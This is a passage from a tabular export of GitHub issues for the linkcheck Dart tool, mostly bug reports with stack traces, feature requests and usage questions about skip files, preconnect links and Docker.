#230    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#231    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#232    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#233    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#234    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#235    _HttpClient.close (dart:_http/http_impl.dart:2152)
#236    worker.<anonymous closure> (package:linkcheck/src/worker/worker.dart:186)
#237    _AsyncAwaitCompleter.start (dart:async-patch/async_patch.dart:43)
#238    worker.<anonymous closure> (package:linkcheck/src/worker/worker.dart:183)
#239    _RootZone.runUnaryGuarded (dart:async/zone.dart:1314)
#240    _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336)
#241    _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263)
#242    _SyncStreamControllerDispatch._sendData (dart:async/stream_controller.dart:764)
#243    _StreamController._add (dart:async/stream_controller.dart:640)
#244    _StreamController.add (dart:async/stream_controller.dart:586)
#245    _RootZone.runUnaryGuarded (dart:async/zone.dart:1314)
#246    _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336)
#247    _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263)
#248    _SyncStreamControllerDispatch._sendData (dart:async/stream_controller.dart:764)
#249    _StreamController._add (dart:async/stream_controller.dart:640)
#250    _StreamController.add (dart:async/stream_controller.dart:586)
#251    _StreamSinkWrapper.add (dart:async/stream_controller.dart:858)
#252    _RootZone.runUnaryGuarded (dart:async/zone.dart:1314)
#253    CastStreamSubscription._onData (dart:_internal/async_cast.dart:81)
#254    _RootZone.runUnaryGuarded (dart:async/zone.dart:1314)
#255    _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336)
#256    _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263)
#257    _SyncStreamControllerDispatch._sendData (dart:async/stream_controller.dart:764)
#258    _StreamController._add (dart:async/stream_controller.dart:640)
#259    _StreamController.add (dart:async/stream_controller.dart:586)
#260    _RawReceivePortImpl._handleMessage (dart:isolate-patch/isolate_patch.dart:172)
",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/52/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/52/comments,https://api.github.com/repos/filiph/linkcheck/issues/52/events,https://github.com/filiph/linkcheck/issues/52,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/51,555610389,MDU6SXNzdWU1NTU2MTAzODk=,51,INTERNAL ERROR,26752,closed,FALSE,NA,NA,3,2020-01-27T14:27:16Z,2021-01-22T06:36:59Z,2021-01-22T06:36:59Z,NONE,NA,"Doing as instructed:

```bash
Sorry! Please open https://github.com/filiph/linkcheck/issues/new in your favorite browser and copy paste the following output there:

Bad state: No element
#0      SetMixin.singleWhere (dart:collection/set.dart:271)
#1      crawl.<anonymous closure> (package:linkcheck/src/crawl.dart:255)
#2      _rootRunUnary (dart:async/zone.dart:1132)
#3      _CustomZone.runUnary (dart:async/zone.dart:1029)
#4      _CustomZone.runUnaryGuarded (dart:async/zone.dart:931)
#5      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336)
#6      _DelayedData.perform (dart:async/stream_impl.dart:591)
#7      _StreamImplEvents.handleNext (dart:async/stream_impl.dart:707)
#8      _PendingEvents.schedule.<anonymous closure> (dart:async/stream_impl.dart:667)
#9      _rootRun (dart:async/zone.dart:1120)
#10     _CustomZone.run (dart:async/zone.dart:1021)
#11     _CustomZone.runGuarded (dart:async/zone.dart:923)
#12     _CustomZone.bindCallbackGuarded.<anonymous closure> (dart:async/zone.dart:963)
#13     _rootRun (dart:async/zone.dart:1124)
#14     _CustomZone.run (dart:async/zone.dart:1021)
#15     _CustomZone.runGuarded (dart:async/zone.dart:923)
#16     _CustomZone.bindCallbackGuarded.<anonymous closure> (dart:async/zone.dart:963)
#17     _microtaskLoop (dart:async/schedule_microtask.dart:41)
#18     _startMicrotaskLoop (dart:async/schedule_microtask.dart:50)
#19     _runPendingImmediateCallback (dart:isolate-patch/isolate_patch.dart:116)
#20     _RawReceivePortImpl._handleMessage (dart:isolate-patch/isolate_patch.dart:173)
```

Otherwise the output looks good to me. For instance I do get back valid warnings like:


```bash
http://www-vbox.transloadit.com/blog/2011/05/fixing-amazon-s3/
- (704:0) '#s3-expo..' => http://www-vbox.transloadit.com/blog/2011/05/fixing-amazon-s3/#blog-posts (HTTP 200 but missing anchor)

http://www-vbox.transloadit.com/blog/2011/05/support-for-leaving-smaller-images-untouched/
- (629:24) 'full doc..' => http://www-vbox.transloadit.com/docs/transcoding/#image-manipulation-and-resizing (HTTP 200 but missing anchor)

http://www-vbox.transloadit.com/blog/2013/01/improvements-for-how-assembly-crashes-are-handled/
- (630:49) 'the new ..' => http://www-vbox.transloadit.com/accounts/api_settings (HTTP 500)
```",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/51/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/51/comments,https://api.github.com/repos/filiph/linkcheck/issues/51/events,https://github.com/filiph/linkcheck/issues/51,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/50,523997775,MDU6SXNzdWU1MjM5OTc3NzU=,50,Unhandled exception for charset,377102,closed,FALSE,NA,NA,4,2019-11-17T15:01:42Z,2019-11-17T19:35:34Z,2019-11-17T19:16:19Z,NONE,NA,"I get this error when running with external link checking enabled.

```
Crawling: 568Unhandled exception:
NoSuchMethodError: The getter 'charset' was called on null.
Receiver: null
Tried calling: charset
#0      Object.noSuchMethod (dart:core-patch/object_patch.dart:51:5)
#1      checkServer (package:linkcheck/src/worker/worker.dart:75:38)
<asynchronous suspension>
#2      worker.<anonymous closure> (package:linkcheck/src/worker/worker.dart:199:42)
<asynchronous suspension>
#3      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#4      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#5      _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#6      _SyncStreamControllerDispatch._sendData (dart:async/stream_controller.dart:764:19)
#7      _StreamController._add (dart:async/stream_controller.dart:640:7)
#8      _StreamController.add (dart:async/stream_controller.dart:586:5)
#9      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#10     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#11     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#12     _SyncStreamControllerDispatch._sendData (dart:async/stream_controller.dart:764:19)
#13     _StreamController._add (dart:async/stream_controller.dart:640:7)
#14     _StreamController.add (dart:async/stream_controller.dart:586:5)
#15     _StreamSinkWrapper.add (dart:async/stream_controller.dart:858:13)
#16     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#17     CastStreamSubscription._onData (dart:_internal/async_cast.dart:81:11)
#18     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#19     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#20     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#21     _SyncStreamControllerDispatch._sendData (dart:async/stream_controller.dart:764:19)
#22     _StreamController._add (dart:async/stream_controller.dart:640:7)
#23     _StreamController.add (dart:async/stream_controller.dart:586:5)
#24     _RawReceivePortImpl._handleMessage (dart:isolate-patch/isolate_patch.dart:172:12)
575Unhandled exception:
NoSuchMethodError: The getter 'charset' was called on null.
Receiver: null
Tried calling: charset
#0      Object.noSuchMethod (dart:core-patch/object_patch.dart:51:5)
#1      checkServer (package:linkcheck/src/worker/worker.dart:75:38)
<asynchronous suspension>
#2      worker.<anonymous closure> (package:linkcheck/src/worker/worker.dart:199:42)
<asynchronous suspension>
#3      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#4      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#5      _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#6      _SyncStreamControllerDispatch._sendData (dart:async/stream_controller.dart:764:19)
#7      _StreamController._add (dart:async/stream_controller.dart:640:7)
#8      _StreamController.add (dart:async/stream_controller.dart:586:5)
#9      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#10     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#11     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#12     _SyncStreamControllerDispatch._sendData (dart:async/stream_controller.dart:764:19)
#13     _StreamController._add (dart:async/stream_controller.dart:640:7)
#14     _StreamController.add (dart:async/stream_controller.dart:586:5)
#15     _StreamSinkWrapper.add (dart:async/stream_controller.dart:858:13)
#16     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#17     CastStreamSubscription._onData (dart:_internal/async_cast.dart:81:11)
#18     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#19     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#20     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#21     _SyncStreamControllerDispatch._sendData (dart:async/stream_controller.dart:764:19)
#22     _StreamController._add (dart:async/stream_controller.dart:640:7)
#23     _StreamController.add (dart:async/stream_controller.dart:586:5)
#24     _RawReceivePortImpl._handleMessage (dart:isolate-patch/isolate_patch.dart:172:12)
```

My command is:

```
linkcheck -e --skip-file linkcheck-skip-file.txt https://site-local.fusionauth.io
```",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/50/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/50/comments,https://api.github.com/repos/filiph/linkcheck/issues/50/events,https://github.com/filiph/linkcheck/issues/50,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/49,523285901,MDU6SXNzdWU1MjMyODU5MDE=,49,"404 errors on <link href=""https://fonts.gstatic.com"" rel=""preconnect"" crossorigin="""">",7723101,closed,FALSE,NA,NA,2,2019-11-15T06:41:47Z,2019-11-15T10:36:51Z,2019-11-15T10:36:51Z,NONE,NA,"I'm trying to check a [mkdocs material](https://squidfunk.github.io/mkdocs-material/) generated documentation.

When checking external links, I get for every page a 
`- (79:8) <link> => https://fonts.gstatic.com (HTTP 404)`

Can this error somehow be suppressed?
I think this is a typical pattern to preconnect to https://fonts.gstatic.com but the URL itself returns a 404!

",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/49/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/49/comments,https://api.github.com/repos/filiph/linkcheck/issues/49/events,https://github.com/filiph/linkcheck/issues/49,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/48,523283773,MDU6SXNzdWU1MjMyODM3NzM=,48,VM initialization failed: Invalid vm isolate snapshot seen,7723101,closed,FALSE,NA,NA,3,2019-11-15T06:35:29Z,2019-11-18T10:06:32Z,2019-11-16T00:02:08Z,NONE,NA,"I added the native binary linkcheck-linux-x64 version 2.0.11 to a local ~/bin directory which is added to the PATH.

When I try to call linkcheck from another directory I get the following error.

`VM initialization failed: Invalid vm isolate snapshot seen`

When calling it directly inside the ~/bin directory, everything works as expected. Really nice tool!",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/48/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/48/comments,https://api.github.com/repos/filiph/linkcheck/issues/48/events,https://github.com/filiph/linkcheck/issues/48,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/47,493115170,MDU6SXNzdWU0OTMxMTUxNzA=,47,Repeatedly getting INTERNAL ERROR,7692728,open,FALSE,NA,NA,0,2019-09-13T03:03:43Z,2019-09-13T03:03:43Z,NA,NONE,NA,"I'm getting this error when running linkcheck on my site. After the error, it seems that the crawl is still continuing though so sometimes the error occurs again later in the crawl. What does it mean and how can I fix it?

```
INTERNAL ERROR: Sorry! Please open https://github.com/filiph/linkcheck/issues/new in your favorite browser and copy paste the following output there:

Bad state: No element
#0      __CompactLinkedHashSet&_HashFieldBase&_HashBase&_OperatorEqualsAndHashCode&SetMixin.singleWhere (dart:collection/set.dart:271:5)
#1      crawl.<anonymous closure> (package:linkcheck/src/crawl.dart:255:20)
#2      _rootRunUnary (dart:async/zone.dart:1132:38)
#3      _CustomZone.runUnary (dart:async/zone.dart:1029:19)
#4      _CustomZone.runUnaryGuarded (dart:async/zone.dart:931:7)
#5      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#6      _DelayedData.perform (dart:async/stream_impl.dart:591:14)
#7      _StreamImplEvents.handleNext (dart:async/stream_impl.dart:707:11)
#8      _PendingEvents.schedule.<anonymous closure> (dart:async/stream_impl.dart:667:7)
#9      _rootRun (dart:async/zone.dart:1120:38)
#10     _CustomZone.run (dart:async/zone.dart:1021:19)
#11     _CustomZone.runGuarded (dart:async/zone.dart:923:7)
#12     _CustomZone.bindCallbackGuarded.<anonymous closure> (dart:async/zone.dart:963:23)
#13     _rootRun (dart:async/zone.dart:1124:13)
#14     _CustomZone.run (dart:async/zone.dart:1021:19)
#15     _CustomZone.runGuarded (dart:async/zone.dart:923:7)
#16     _CustomZone.bindCallbackGuarded.<anonymous closure> (dart:async/zone.dart:963:23)
#17     _microtaskLoop (dart:async/schedule_microtask.dart:41:21)
#18     _startMicrotaskLoop (dart:async/schedule_microtask.dart:50:5)
#19     _runPendingImmediateCallback (dart:isolate-patch/isolate_patch.dart:116:13)
#20     _RawReceivePortImpl._handleMessage (dart:isolate-patch/isolate_patch.dart:173:5)
```",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/47/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/47/comments,https://api.github.com/repos/filiph/linkcheck/issues/47/events,https://github.com/filiph/linkcheck/issues/47,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/46,490116325,MDU6SXNzdWU0OTAxMTYzMjU=,46,GitHub Actions,2289,closed,FALSE,NA,NA,2,2019-09-06T03:58:45Z,2021-01-22T17:18:09Z,2021-01-22T06:47:17Z,NONE,NA,"This tool seems like a good candidate for a [GitHub Actions](https://github.com/features/actions) workflow. Has anyone already looked into setting that up?

cc @filiph ",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/46/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/46/comments,https://api.github.com/repos/filiph/linkcheck/issues/46/events,https://github.com/filiph/linkcheck/issues/46,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/45,484360129,MDU6SXNzdWU0ODQzNjAxMjk=,45,"[QUESTION] ""HTTP 200 but missing anchor"" and ""connection failed""?",7692728,open,FALSE,NA,NA,1,2019-08-23T06:52:18Z,2019-11-28T09:14:39Z,NA,NONE,NA,"I am getting a lot of ""HTTP 200 but missing anchor"" and ""connection failed"" errors when scanning my site but if I try the links manually, they seem fine. Unfortunately the site can only be used within my company's network so I can't post the link but what do these errors mean and is there a way to ignore them?",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/45/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/45/comments,https://api.github.com/repos/filiph/linkcheck/issues/45/events,https://github.com/filiph/linkcheck/issues/45,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/44,460691872,MDExOlB1bGxSZXF1ZXN0MjkxNzY4MjQ3,44,Prepare for upcoming change to HttpRequest and HttpClientResponse,15253456,closed,FALSE,NA,NA,2,2019-06-25T23:33:36Z,2019-07-09T00:47:54Z,2019-07-09T00:47:47Z,CONTRIBUTOR,NA,"An upcoming change to the Dart SDK will change `HttpRequest` and
`HttpClientResponse` from implementing `Stream<List<int>>` to
implementing `Stream<Uint8List>`.

This forwards-compatible change prepares for that SDK breaking
change by casting the Stream to `List<int>` before transforming
it.

https://github.com/dart-lang/sdk/issues/36900",NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/44/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/44/comments,https://api.github.com/repos/filiph/linkcheck/issues/44/events,https://github.com/filiph/linkcheck/pull/44,https://api.github.com/repos/filiph/linkcheck/pulls/44
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/43,459102709,MDU6SXNzdWU0NTkxMDI3MDk=,43,Feature Request: Enhancement,16874272,open,FALSE,NA,NA,0,2019-06-21T09:26:45Z,2019-06-21T10:49:48Z,NA,NONE,NA,"Hello, 
Can you please look into this.
<img width=""597"" alt=""Screenshot 2019-06-21 at 4 18 56 PM"" src=""https://user-images.githubusercontent.com/16874272/59917739-5e27df80-9440-11e9-9a83-7d227d640248.png"">

Here is a property(maxlength) to buildTag for link, where it has limit upto 10 character, which truncates information of longer text. Will it be possible for you to increase limit(100 or more) or give a command line parameter to give length based on it.
If you don't have time, Can i raise a pull request for it.

Thank you,
",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/43/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/43/comments,https://api.github.com/repos/filiph/linkcheck/issues/43/events,https://github.com/filiph/linkcheck/issues/43,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/42,455318045,MDExOlB1bGxSZXF1ZXN0Mjg3NTkxMjU5,42,update README.md with docker skipfile example,15839,closed,FALSE,NA,NA,0,2019-06-12T16:43:55Z,2019-06-12T18:47:25Z,2019-06-12T18:47:25Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/42/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/42/comments,https://api.github.com/repos/filiph/linkcheck/issues/42/events,https://github.com/filiph/linkcheck/pull/42,https://api.github.com/repos/filiph/linkcheck/pulls/42
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/41,450131988,MDU6SXNzdWU0NTAxMzE5ODg=,41,Handle preconnect links correctly,919717,open,FALSE,NA,NA,4,2019-05-30T05:05:38Z,2020-11-07T05:54:44Z,NA,OWNER,NA,"`<link rel=""preconnect"" href=""https://www.googletagmanager.com"" />` is a hint to start DNS lookup and so on, for the domain. The actual page can be 404.

Current status:

* Preconnect links are considered like any other link, being fetched / HEAD-ed when `-e`.
* For the specific example of `<link rel=""preconnect"" href=""https://www.googletagmanager.com"" />`, this means a HTTP 400 error is reported (because https://www.googletagmanager.com is not a valid page). 

Ideal solution:

* Preconnect is recognized and `linkcheck` then merely verifies that the domain exists and connects.
* `linkcheck` might show a warning when there's a `preconnect` link and then no actual link to that domain. (Problem: many times the actual link is constructed in JavaScript.)

Realistic solution:

* Preconnect links are ignored. After all, it is just a hint, and sooner a later an actual link is coming.",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/41/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/41/comments,https://api.github.com/repos/filiph/linkcheck/issues/41/events,https://github.com/filiph/linkcheck/issues/41,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/40,445765569,MDU6SXNzdWU0NDU3NjU1Njk=,40,Unhandled exception,26612284,closed,FALSE,NA,NA,9,2019-05-19T00:04:06Z,2021-01-22T06:36:44Z,2021-01-22T06:36:44Z,NONE,NA,"```
Unhandled exception:
NoSuchMethodError: The getter 'primaryType' was called on null.
Receiver: null
Tried calling: primaryType
#0      Object.noSuchMethod (dart:core-patch/object_patch.dart:50:5)
#1      DestinationResult.updateFromResponse (package:linkcheck/src/destination.dart:327:48)
#2      checkPage (package:linkcheck/src/worker/worker.dart:127:11)
<asynchronous suspension>
#3      worker.<anonymous closure> (package:linkcheck/src/worker/worker.dart:192:29)
<asynchronous suspension>
#4      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#5      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#6      _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#7      _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#8      _StreamController._add (dart:async/stream_controller.dart:640:7)
#9      _StreamController.add (dart:async/stream_controller.dart:586:5)
#10     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#11     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#12     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#13     _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#14     _StreamController._add (dart:async/stream_controller.dart:640:7)
#15     _StreamController.add (dart:async/stream_controller.dart:586:5)
#16     _StreamSinkWrapper.add (dart:async/stream_controller.dart:858:13)
#17     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#18     CastStreamSubscription._onData (dart:_internal/async_cast.dart:81:11)
#19     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#20     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#21     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#22     _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#23     _StreamController._add (dart:async/stream_controller.dart:640:7)
#24     _StreamController.add (dart:async/stream_controller.dart:586:5)
#25     _RawReceivePortImpl._handleMessage (dart:isolate-patch/isolate_patch.dart:171:12)

```",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/40/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/40/comments,https://api.github.com/repos/filiph/linkcheck/issues/40/events,https://github.com/filiph/linkcheck/issues/40,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/39,439135623,MDU6SXNzdWU0MzkxMzU2MjM=,39,Feature Request: option to silence denied by robots output,3321281,open,FALSE,NA,NA,1,2019-05-01T11:23:54Z,2019-12-24T13:43:57Z,NA,NONE,NA,"Standard: `Access to these URLs denied by robots.txt, so we couldn't check them.`

Feature: `--silence-robots` creates no output
",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/39/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/39/comments,https://api.github.com/repos/filiph/linkcheck/issues/39/events,https://github.com/filiph/linkcheck/issues/39,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/38,439134838,MDU6SXNzdWU0MzkxMzQ4Mzg=,38,Unhandled exception always on the same external site,3321281,open,FALSE,NA,NA,3,2019-05-01T11:20:08Z,2019-05-28T07:09:36Z,NA,NONE,NA,"Running linkcheck on a local site build including external links to be checked,
I always get an unhandled exception on the same external page, see below:

```
linkcheck -e --skip-file ../my_skip_file.txt --no-connection-failures-as-warnings > ../linkchecker.log 

Unhandled exception:
HttpException: Connection closed while receiving data, uri = https://jira.mariadb.org/robots.txt
#0      checkServer (package:linkcheck/src/worker/worker.dart:81:15)
<asynchronous suspension>
#1      worker.<anonymous closure> (package:linkcheck/src/worker/worker.dart:199:42)
<asynchronous suspension>
#2      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#3      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#4      _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#5      _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#6      _StreamController._add (dart:async/stream_controller.dart:640:7)
#7      _StreamController.add (dart:async/stream_controller.dart:586:5)
#8      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#9      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#10     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#11     _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#12     _StreamController._add (dart:async/stream_controller.dart:640:7)
#13     _StreamController.add (dart:async/stream_controller.dart:586:5)
#14     _StreamSinkWrapper.add (dart:async/stream_controller.dart:858:13)
#15     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#16     CastStreamSubscription._onData (dart:_internal/async_cast.dart:81:11)
#17     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#18     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#19     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#20     _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#21     _StreamController._add (dart:async/stream_controller.dart:640:7)
#22     _StreamController.add (dart:async/stream_controller.dart:586:5)
#23     _RawReceivePortImpl._handleMessage (dart:isolate/runtime/libisolate_patch.dart:171:12)
INTERNAL ERROR: Sorry! Please open https://github.com/filiph/linkcheck/issues/new in your favorite browser and copy paste the following output there:

Bad state: No element
```",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/38/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/38/comments,https://api.github.com/repos/filiph/linkcheck/issues/38/events,https://github.com/filiph/linkcheck/issues/38,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/37,438906765,MDU6SXNzdWU0Mzg5MDY3NjU=,37,docker skip-file,15839,closed,FALSE,NA,NA,4,2019-04-30T18:08:00Z,2019-06-12T16:46:01Z,2019-06-12T16:44:59Z,CONTRIBUTOR,NA,"Is there a way to utilize a skip file while running linkcheck through docker?

if I do something like 
`docker run filiph/linkcheck http://example.com/ --skip-file ./skipfile.txt`

I get:
`Can't read skip file './skipfile.txt': FileSystemException: Cannot open file, path = './skipfile.txt' (OS Error: No such file or directory, errno = 2)`

which makes sense as the skip file does not exist in the docker environment. Is there a way to work around this that I'm missing?

Thanks!",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/37/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/37/comments,https://api.github.com/repos/filiph/linkcheck/issues/37/events,https://github.com/filiph/linkcheck/issues/37,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/36,433521247,MDU6SXNzdWU0MzM1MjEyNDc=,36,FR: Output list of links found,9192186,closed,FALSE,NA,NA,1,2019-04-15T23:34:39Z,2019-04-15T23:36:47Z,2019-04-15T23:36:47Z,NONE,NA,Not sure if this is out of scope - it would be useful for me to get a list of the links which were checked so I can do some post processing. ,NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/36/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/36/comments,https://api.github.com/repos/filiph/linkcheck/issues/36/events,https://github.com/filiph/linkcheck/issues/36,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/35,430028471,MDU6SXNzdWU0MzAwMjg0NzE=,35,Linkcheck Internal errors and Unhandled exception,49340616,closed,FALSE,NA,NA,5,2019-04-06T12:21:16Z,2019-09-30T19:34:53Z,2019-09-30T19:28:28Z,NONE,NA,"Hi Filip,

Again compliments. Linkcheck is the fastest linkchecker I'm aware of. Here are some issues I've found.

Best regards,
Hans


$ linkcheck wordpress.org
Crawling: 459INTERNAL ERROR: Sorry! Please open https://github.com/filiph/linkcheck/issues/new in your favorite browser and copy paste the following output there:

Invalid argument(s): Text ""<a href=""https://wordpress.org/support/topic/%f0%9f%91%8d-13/"" title=""👍"">"" must be 73 characters long.

736INTERNAL ERROR: Sorry! Please open https://github.com/filiph/linkcheck/issues/new in your favorite browser and copy paste the following output there:

Invalid argument(s): Text ""<a href=""https://wordpress.org/support/users/josevarghese/"" title=""View Jose Varghese 🤸&#039;s profile"" class=""bbp-author-name"">"" must be 128 characters long.

$ linkcheck https://autorijschoolokido.nl/
Crawling: 96Unhandled exception:
NoSuchMethodError: The getter 'primaryType' was called on null.
Receiver: null
Tried calling: primaryType
#0      Object.noSuchMethod (dart:core/runtime/libobject_patch.dart:50:5)
#1      DestinationResult.updateFromResponse (package:linkcheck/src/destination.dart:327:48)
#2      checkPage (package:linkcheck/src/worker/worker.dart:127:11)
<asynchronous suspension>
#3      worker.<anonymous closure> (package:linkcheck/src/worker/worker.dart:192:29)
<asynchronous suspension>
#4      _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#5      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#6      _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#7      _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#8      _StreamController._add (dart:async/stream_controller.dart:640:7)
#9      _StreamController.add (dart:async/stream_controller.dart:586:5)
#10     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#11     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#12     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#13     _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#14     _StreamController._add (dart:async/stream_controller.dart:640:7)
#15     _StreamController.add (dart:async/stream_controller.dart:586:5)
#16     _StreamSinkWrapper.add (dart:async/stream_controller.dart:858:13)
#17     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#18     CastStreamSubscription._onData (dart:_internal/async_cast.dart:81:11)
#19     _RootZone.runUnaryGuarded (dart:async/zone.dart:1314:10)
#20     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336:11)
#21     _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263:7)
#22     _SyncStreamController._sendData (dart:async/stream_controller.dart:764:19)
#23     _StreamController._add (dart:async/stream_controller.dart:640:7)
#24     _StreamController.add (dart:async/stream_controller.dart:586:5)
